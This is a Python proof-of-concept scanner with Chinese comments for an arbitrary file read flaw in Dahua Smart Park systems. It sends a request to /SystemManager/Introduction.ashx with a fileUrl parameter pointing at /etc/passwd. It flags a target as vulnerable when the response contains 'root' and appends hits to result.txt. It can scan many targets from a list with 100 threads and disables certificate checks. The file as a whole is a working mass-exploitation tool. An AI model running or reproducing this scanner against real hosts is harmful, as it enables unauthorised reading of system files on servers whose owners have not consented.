import requests
import sys
import argparse
import json
import logging
from multiprocessing.dummy import Pool

# 禁用 urllib3 警告
requests.packages.urllib3.disable_warnings()

# 设置日志配置
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'


def banner():
    test = r"""
  ██░ ██  ▄▄▄       ██▀███  ▓█████▄  ▒█████    ▄████ 
  ▓██░ ██▒▒████▄    ▓██ ▒ ██▒▒██▀ ██▌▒██▒  ██▒ ██▒ ▀█▒
  ▒██▀▀██░▒██  ▀█▄  ▓██ ░▄█ ▒░██   █▌▒██░  ██▒▒██░▄▄▄░
  ░▓█ ░██ ░██▄▄▄▄██ ▒██▀▀█▄  ░▓█▄   ▌▒██   ██░░▓█  ██▓
  ░▓█▒░██▓ ▓█   ▓██▒░██▓ ▒██▒░▒████▓ ░ ████▓▒░░▒▓███▀▒
   ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒▓  ▒ ░ ▒░▒░▒░  ░▒   ▒ 
   ▒ ░▒░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ▒  ▒   ░ ▒ ▒░   ░   ░ 
   ░  ░░ ░  ░   ▒     ░░   ░  ░ ░  ░ ░ ░ ░ ▒  ░ ░   ░ 
   ░  ░  ░      ░  ░   ░        ░        ░ ░        ░ 
                            ░                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
                                    version: 1.1.0
                                    author: Hardog                                    
"""
    logging.info(test)


def main():
    banner()  # 打印欢迎界面
    parser = argparse.ArgumentParser(description='大华智慧园区 任意文件读取漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='File Path')
    args = parser.parse_args()

    # 判断输入的参数是单个 URL 还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        # 多线程处理
        with Pool(100) as mp:
            mp.map(poc, url_list)
    else:
        logging.error("Usage:\n\t python3 {} -h".format(sys.argv[0]))


def poc(target):
    payload_url = '/SystemManager/Introduction.ashx?fileUrl=file:/etc/passwd'
    url = target + payload_url
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'application/json',
        'Connection': 'close'
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }

    try:
        res = requests.get(url=url, headers=headers, verify=False, timeout=10)

        if res.status_code == 200 and "root" in res.text:
            logging.info(f"{GREEN}[+] 该网站存在任意文件读取漏洞，url为 {target}{RESET}")
            with open("result.txt", "a", encoding="utf-8") as fp:
                fp.write(target + '\n')
            return True
        else:
            logging.info(f"[-] 该网站不存在任意文件读取漏洞，url为 {target}")

    except Exception as e:
        logging.error(f"[*] 该网站无法访问，url为: {target}, 错误信息: {e}")
        return False


if __name__ == '__main__':
    main()
